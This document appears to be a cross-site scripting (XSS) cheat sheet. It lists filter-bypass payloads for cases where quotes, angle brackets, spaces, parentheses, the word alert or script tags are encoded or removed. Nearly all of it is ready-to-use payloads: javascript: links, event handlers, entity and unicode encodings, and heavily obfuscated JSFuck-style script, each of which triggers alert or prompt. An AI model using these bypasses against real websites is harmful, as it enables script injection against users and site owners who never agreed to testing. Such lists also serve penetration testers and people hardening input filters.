### 1.If you cannot escape from the attribute (" is being encoded or deleted)

Try to use this payloads :
```
1) <a href="javascript:alert(1)"  >Click</a>

2) <a href="&#01;javascript:alert(1)">Click</a>

3) <a src="google.com" onclick="alert(1)"  >Click</a>
```
Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:
```
4) \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
```

### 2.If you can escape from the attribute but not from the tag (> is encoded or deleted)

Try to event handlers :
```
1) <input   value"XXXXXXX"   onclick=alert(1)  >Click</input>

2) <input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" > <!--    If you cannot escape from the attribute (" is being encoded or deleted))

3) <img src=x  onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

4) </div><a  src="google.com"  href="javaSCRIPT&colon;alert(/xss/)">XSS</a>

5) <a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}>Click</a>
```
or use encodes:
```
%3cscript%3e
%253cscript%253e
&lt;script&gt;

%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>
```
### 3.If alert is encoded or deleted

Try to use this payloads :
```
1) <script>$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()</script>

2) <script>[[,$,_,$$,__,$_,_$,$$$,$__,,___]=[![]+[]+!![]][+[]]+[][[]]],$$_=[][$+$_],[,,,$_$,,,_$$,,,,,__$,_$_]=[...$$_+[]],$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$$$_[$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$]($+_+__+_$+$_+__$+[+!!$]+_$_)()</script>

3) <script>
   (
   [
   ,
   O
   ,
   B
   ,
   J
   ,
   E
   ,
   C
   ,
   ,
   ]
   =
   [
   ]
   +
   {
   }
   ,
   [
   T
   ,
   R
   ,
   U
   ,
   E
   ,
   F
   ,
   A
   ,
   L
   ,
   S
   ,
   ,
   ,
   N
   ]
   =
   [
   !
   !
   O
   ]
   +
   !
   O
   +
   B
   .
   E
   )
   [
   X
   =
   C
   +
   O
   +
   N
   +
   S
   +
   T
   +
   R
   +
   U
   +
   C
   +
   T
   +
   O
   +
   R
   ]
   [
   X
   ]
   (
   A
   +
   L
   +
   E
   +
   R
   +
   T
   +
   `
   (
   1
   )
   `
   )
   (
   )
   </script>
   
4) <html>
   <body>
   <head>
   <meta charset="utf-8">   
   </head> 
   <script>
   ᐁ='',ᐃ=!ᐁ+ᐁ,ᐅ=!ᐃ+ᐁ
   ᐊ=ᐁ+{},ᐄ=ᐃ[ᐁ++],ᐆ=
   ᐃ[ᐋ=ᐁ],ᐒ=++ᐋ+ᐁ,ᐗ
   =ᐊ[ᐋ+ᐒ],ᐃ[ᐗ+=ᐊ[ᐁ]
   +(ᐃ.ᐅ+ᐊ)[ᐁ]+ᐅ[ᐒ]+ᐄ
   +ᐆ+ᐃ[ᐋ]+ᐗ+ᐄ+ᐊ[ᐁ]
   +ᐆ][ᐗ](ᐅ[ᐁ]+ᐅ[ᐋ]+ᐃ
   [ᐒ]+ᐆ+ᐄ+"`ᐁᐃ`")()
   </script>
   </html>
   </body>

5) <script>prompt(1)</script>

```

### 4.If space is encoded or deleted
```
use tab ;)
```

### 5.If () is encoded or deleted
```
<script>alert`1`</script>
```

### 5.If <script> is encoded or deleted try other tags like:
```
SVG, img, iframe 
```
